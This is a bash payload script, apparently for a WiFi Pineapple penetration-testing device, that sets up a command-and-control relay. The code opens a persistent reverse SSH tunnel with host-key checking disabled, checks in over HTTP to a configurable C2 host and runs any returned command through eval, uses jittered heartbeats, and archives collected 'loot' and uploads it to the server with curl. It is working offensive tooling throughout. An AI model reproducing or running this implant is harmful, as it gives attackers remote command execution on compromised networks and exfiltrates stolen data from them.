#!/bin/bash
# Title: Cloud C2 Relay - Cloud Command & Control Interface
# Author: bad-antics
# Description: Secure cloud relay for remote Pineapple management via encrypted tunnels
# Category: nullsec/remote

LOOT_DIR="/mmc/nullsec/cloudc2"
mkdir -p "$LOOT_DIR"

PROMPT "CLOUD C2 RELAY

Remote Management Interface

Capabilities:
- Reverse SSH tunnel
- WireGuard VPN relay
- HTTP C2 check-in
- Encrypted loot upload
- Remote payload exec
- Heartbeat monitoring
- Kill switch support

Press OK to configure."

PROMPT "C2 MODE:

1. Reverse SSH Tunnel
2. WireGuard Relay
3. HTTP Check-in
4. Auto (try all)

Select mode next."

MODE=$(NUMBER_PICKER "Mode (1-4):" 4)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=4 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
C2_LOG="$LOOT_DIR/c2_${TIMESTAMP}.log"

# C2 Configuration
C2_HOST="${C2_HOST:-}"
C2_PORT="${C2_PORT:-4443}"
C2_USER="${C2_USER:-nullsec}"
HEARTBEAT_INTERVAL=60
TUNNEL_PORT=2222
WG_ENDPOINT=""

{
    echo "Cloud C2 Session - $(date)"
    echo "Mode: $MODE"
    echo "================================"
} > "$C2_LOG"

# Check internet connectivity
check_connectivity() {
    for target in 1.1.1.1 8.8.8.8 9.9.9.9; do
        ping -c1 -W3 "$target" &>/dev/null && return 0
    done
    return 1
}

# Reverse SSH tunnel
setup_reverse_ssh() {
    local host="$1" port="$2" user="$3" tunnel_port="$4"

    if [ -z "$host" ]; then
        ERROR_DIALOG "C2 host not configured!

Set C2_HOST environment
variable or edit payload."
        return 1
    fi

    SPINNER_START "Establishing reverse tunnel..."

    # Create persistent reverse tunnel
    ssh -f -N -R "${tunnel_port}:localhost:22" \
        -o StrictHostKeyChecking=no \
        -o ServerAliveInterval=60 \
        -o ServerAliveCountMax=3 \
        -o ExitOnForwardFailure=yes \
        -p "$port" "${user}@${host}" 2>/dev/null

    if [ $? -eq 0 ]; then
        SPINNER_STOP
        echo "Reverse SSH tunnel: ${host}:${tunnel_port} -> localhost:22" >> "$C2_LOG"
        return 0
    else
        SPINNER_STOP
        echo "Reverse SSH failed to ${host}" >> "$C2_LOG"
        return 1
    fi
}

# WireGuard VPN relay
setup_wireguard() {
    if ! command -v wg &>/dev/null; then
        echo "WireGuard not available" >> "$C2_LOG"
        return 1
    fi

    if [ ! -f /etc/wireguard/c2.conf ]; then
        # Generate keys if needed
        local privkey pubkey
        privkey=$(wg genkey 2>/dev/null)
        pubkey=$(echo "$privkey" | wg pubkey 2>/dev/null)

        echo "WireGuard keys generated" >> "$C2_LOG"
        echo "Public key: $pubkey" >> "$C2_LOG"
        echo "Configure server with this public key" >> "$C2_LOG"
        return 1
    fi

    SPINNER_START "Activating WireGuard tunnel..."
    wg-quick up c2 2>/dev/null

    if [ $? -eq 0 ]; then
        SPINNER_STOP
        local wg_ip
        wg_ip=$(ip -4 addr show c2 2>/dev/null | grep -oP '\d+\.\d+\.\d+\.\d+' | head -1)
        echo "WireGuard tunnel up: $wg_ip" >> "$C2_LOG"
        return 0
    else
        SPINNER_STOP
        echo "WireGuard activation failed" >> "$C2_LOG"
        return 1
    fi
}

# HTTP C2 check-in
http_checkin() {
    local host="$1" port="$2"
    local url="https://${host}:${port}/api/checkin"

    # Device info payload
    local hostname
    hostname=$(cat /proc/sys/kernel/hostname 2>/dev/null || hostname)
    local ip
    ip=$(ip -4 addr show | grep -oP '\d+\.\d+\.\d+\.\d+' | grep -v '127.0.0' | head -1)
    local uptime
    uptime=$(cat /proc/uptime | cut -d' ' -f1)
    local load
    load=$(cat /proc/loadavg | cut -d' ' -f1-3)

    local payload
    payload=$(cat << JEOF
{
    "hostname": "$hostname",
    "ip": "$ip",
    "uptime": "$uptime",
    "load": "$load",
    "timestamp": "$(date -Iseconds)",
    "version": "1.0.0"
}
JEOF
)

    # Check in
    local response
    response=$(curl -sk -X POST "$url" \
        -H "Content-Type: application/json" \
        -H "X-Device-ID: $(cat /sys/class/net/wlan0/address 2>/dev/null || echo 'unknown')" \
        -d "$payload" 2>/dev/null)

    echo "HTTP check-in to ${url}: $response" >> "$C2_LOG"

    # Parse response for commands
    if [ -n "$response" ]; then
        local cmd
        cmd=$(echo "$response" | grep -oP '"command"\s*:\s*"[^"]*"' | cut -d'"' -f4)
        if [ -n "$cmd" ]; then
            echo "Received command: $cmd" >> "$C2_LOG"
            # Execute and return results
            local result
            result=$(eval "$cmd" 2>&1 | head -100)
            echo "Command result: $result" >> "$C2_LOG"
        fi
    fi
}

# Heartbeat loop
heartbeat_loop() {
    local mode="$1"

    while true; do
        # Check kill switch
        if [ -f /tmp/c2_kill ]; then
            echo "Kill switch activated - shutting down" >> "$C2_LOG"
            break
        fi

        case "$mode" in
            http)
                http_checkin "$C2_HOST" "$C2_PORT"
                ;;
            ssh)
                # Verify tunnel is alive
                if ! pgrep -f "ssh.*-R.*${TUNNEL_PORT}" &>/dev/null; then
                    echo "Tunnel died - reconnecting" >> "$C2_LOG"
                    setup_reverse_ssh "$C2_HOST" "$C2_PORT" "$C2_USER" "$TUNNEL_PORT"
                fi
                ;;
        esac

        # Jitter: random delay ±30%
        local jitter=$(( HEARTBEAT_INTERVAL * (70 + RANDOM % 60) / 100 ))
        sleep "$jitter"
    done
}

# Loot upload
upload_loot() {
    local host="$1" port="$2"
    local url="https://${host}:${port}/api/loot"

    SPINNER_START "Uploading loot..."

    if [ -d "$LOOT_DIR" ]; then
        local archive="/tmp/loot_${TIMESTAMP}.tar.gz"
        tar czf "$archive" -C "$LOOT_DIR" . 2>/dev/null

        curl -sk -X POST "$url" \
            -F "file=@${archive}" \
            -H "X-Device-ID: $(cat /sys/class/net/wlan0/address 2>/dev/null)" \
            2>/dev/null

        rm -f "$archive"
        echo "Loot uploaded" >> "$C2_LOG"
    fi

    SPINNER_STOP
}

# Main execution
if ! check_connectivity; then
    ERROR_DIALOG "No internet connection!

C2 relay requires
network connectivity.

Check your connection."
    exit 1
fi

CONNECTED=false

case "$MODE" in
    1) # Reverse SSH
        if setup_reverse_ssh "$C2_HOST" "$C2_PORT" "$C2_USER" "$TUNNEL_PORT"; then
            CONNECTED=true
        fi
        ;;
    2) # WireGuard
        if setup_wireguard; then
            CONNECTED=true
        fi
        ;;
    3) # HTTP check-in
        CONNECTED=true
        ;;
    4) # Auto - try all
        if setup_wireguard 2>/dev/null; then
            CONNECTED=true
            echo "Connected via WireGuard" >> "$C2_LOG"
        elif setup_reverse_ssh "$C2_HOST" "$C2_PORT" "$C2_USER" "$TUNNEL_PORT" 2>/dev/null; then
            CONNECTED=true
            echo "Connected via SSH tunnel" >> "$C2_LOG"
        else
            CONNECTED=true
            echo "Falling back to HTTP check-in" >> "$C2_LOG"
        fi
        ;;
esac

if [ "$CONNECTED" = true ]; then
    PROMPT "C2 RELAY ACTIVE

Mode: $(case $MODE in
    1) echo 'Reverse SSH' ;;
    2) echo 'WireGuard' ;;
    3) echo 'HTTP Check-in' ;;
    4) echo 'Auto' ;;
esac)

Heartbeat: ${HEARTBEAT_INTERVAL}s
Kill switch: /tmp/c2_kill

Log: c2_${TIMESTAMP}.log
Loot: $LOOT_DIR

C2 running in background.
Touch /tmp/c2_kill to stop."
else
    ERROR_DIALOG "Failed to establish
C2 connection.

Check C2_HOST config
and network settings."
fi
